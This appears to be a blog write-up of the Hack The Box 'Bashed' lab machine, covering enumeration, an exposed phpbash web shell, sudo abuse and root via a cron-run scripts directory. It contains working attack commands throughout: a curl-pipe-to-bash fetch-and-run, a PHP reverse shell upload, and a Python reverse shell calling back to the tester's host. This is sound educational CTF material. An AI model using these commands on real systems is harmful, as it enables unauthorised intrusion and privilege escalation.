@@ -1,0 +1,248 @@
+---
+title: Bashed Writeup - Hack The Box
+description: Exploring the Bashed machine on Hack The Box.
+author: Nontas Bakoulas
+date: 2025-10-01
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+We first start with a classic `nmap` scan:
+
+```console title="Nmap scan"
+nontas@local$ nmap -sV -sC 10.129.81.107 -oA nmap/initial
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-01 18:03 EEST
+Nmap scan report for 10.129.81.107
+Host is up (0.049s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Arrexel's Development Site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
+```
+a web app is running on port `80`.
+
+![Website homepage](/images/blog/bashed/20251001180859.png)
+
+![Website development info](/images/blog/bashed/20251001180932.png)
+there's a [Github link](https://github.com/Arrexel/phpbash) that gives us the code for `phpbash`, can be quite useful.
+
+<Callout title="Note" type="info">
+The website mentions **"I actually developed it on this exact server!"**, so we need to find **where** `phpbash` is located.
+</Callout>
+
+### Directory Fuzzing
+We can use `ffuf`:
+```console title="Directory fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.81.107:80/FUZZ -ic
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.81.107:80/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 54ms]
+images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 84ms]
+uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 63ms]
+php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 74ms]
+css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 88ms]
+dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 89ms]
+js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 71ms]
+fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 91ms]
+                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 3251ms]
+:: Progress: [87651/87651] :: Job [1/1] :: 56 req/sec :: Duration: [0:06:00] :: Errors: 0 ::
+```
+we get multiple `301` responses, visiting the paths on the browser shows the files on the server.
+
+In `/dev` we can see the following: 
+![Directory listing](/images/blog/bashed/20251001181435.png)
+so we've found `phpbash.php` on the path `/dev/phpbash.php`.
+
+![PHP Bash interface](/images/blog/bashed/20251001181624.png)
+
+Get the flag at `/home/arrexel/user.txt`
+### Enumerate Host
+**Prepare script locally:**
+```console title="Start local web server"
+nontas@local$ ip a
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none 
+    inet 10.10.14.78/23 scope global tun0
+nontas@local$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
+nontas@local$ python3 -m http.server 8082
+```
+
+**Download script on the remote:**
+```console title="Download LinEnum on remote"
+www-data@bashed:/var/www/html/dev# cd /dev/shm
+www-data@bashed:/dev/shm# wget 10.10.14.78:8082/LinEnum.sh
+www-data@bashed:/dev/shm# bash LinEnum.sh
+<SNIP>
+uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
+<SNIP>
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+<SNIP>
+```
+or use `sudo -l` to check sudo privileges.
+
+<Callout title="Alternative Approach" type="info">
+We don't have access to `curl` (check with `which curl`), but if we did we could've done
+```bash
+curl 10.10.14.78:8082/LinEnum.sh | bash
+```
+</Callout>
+
+**We can run commands as `scriptmanager` without a password.**
+
+The problem is we **cannot** change to this user for the rest of the shell session via `sudo -u scriptmanager bash`. So let's get reverse shell access.
+### Reverse Shell
+Run a local webserver on port `1234`:
+```console title="Start netcat listener"
+nontas@local$ nc -lvnp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+```
+
+Next, we'll use a reverse shell cheat sheet like [this one], but we'll quickly find out that **the reverse shells don't work by just copy pasting the commands.**
+
+What we can try is:
+1. Use a pre-made php reverse shell:
+```bash
+cp /opt/lists/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php .
+
+# Change IP and port
+sudo nano php-reverse-shell.php
+```
+2. Start a python web server:
+```bash
+python3 -m http.server 8082
+```
+3. On the remote, download it:
+```bash
+www-data@bashed:/dev/shm# cd /var/www/html/uploads
+www-data@bashed:/dev/shm# wget 10.10.14.78:8082/php-reverse-shell.php
+```
+4. Go to the browser at `/uploads/php-reverse-shell.php`
+5. You should have reverse shell access
+
+Upgrade TTY:
+```console title="Upgrade TTY"
+python -c 'import pty; pty.spawn("/bin/bash")'
+[CTRL+Z]
+stty raw -echo
+fg
+```
+
+Now switch user:
+```console title="Switch to scriptmanager"
+www-data@bashed:/$ sudo -u scriptmanager bash
+```
+
+## Privilege Escalation
+First, check the root directory:
+```console title="List root directory"
+scriptmanager@bashed:/$ ls -al
+ls -al
+total 92
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
+-rw-------   1 root          root            212 Jun 14  2022 .bash_history
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
+drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
+drwxr-xr-x  19 root          root           4140 Oct  1 03:32 dev
+drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
+drwx------   2 root          root          16384 Dec  4  2017 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+dr-xr-xr-x 180 root          root              0 Oct  1 03:32 proc
+drwx------   3 root          root           4096 Oct  1 03:33 root
+drwxr-xr-x  18 root          root            540 Oct  1 06:25 run
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Oct  1 06:18 sys
+drwxrwxrwt  10 root          root           4096 Oct  1 07:16 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
+lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+```
+the folder `scripts` is owned by `scriptmanager`.
+
+```console title="Check scripts directory"
+scriptmanager@bashed:/scripts$ ls -al
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
+drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Oct  1 07:18 test.txt
+```
+the file `test.py` **runs every minute** from what we can see.
+
+```console title="Examine test.py"
+scriptmanager@bashed:/scripts$ cat test.py
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+```
+
+We can:
+- Modify the `test.py` script, or
+- Create a new python script (it will also run every minute after testing)
+We'll go with the latter.
+
+Use a python script from [here](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python):
+```console
+nontas@local$ cat python-shell.py 
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.78",4321))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
+```
+
+Start a new listener:
+```console title="Start root listener"
+nontas@local$ nc -lnvp 4321
+```
+
+and download the reverse shell on the remote:
+```console title="Download reverse shell"
+scriptmanager@bashed:/scripts$ wget 10.10.14.78:8082/python-shell.py
+```
+after ~ a minute, you should have shell access **as the root user.**
+
+Get the final flag:
+```console title="Get root flag"
+root@bashed:/# cat root/root.txt
+```
+
+and we have successfully completed **Bashed**!
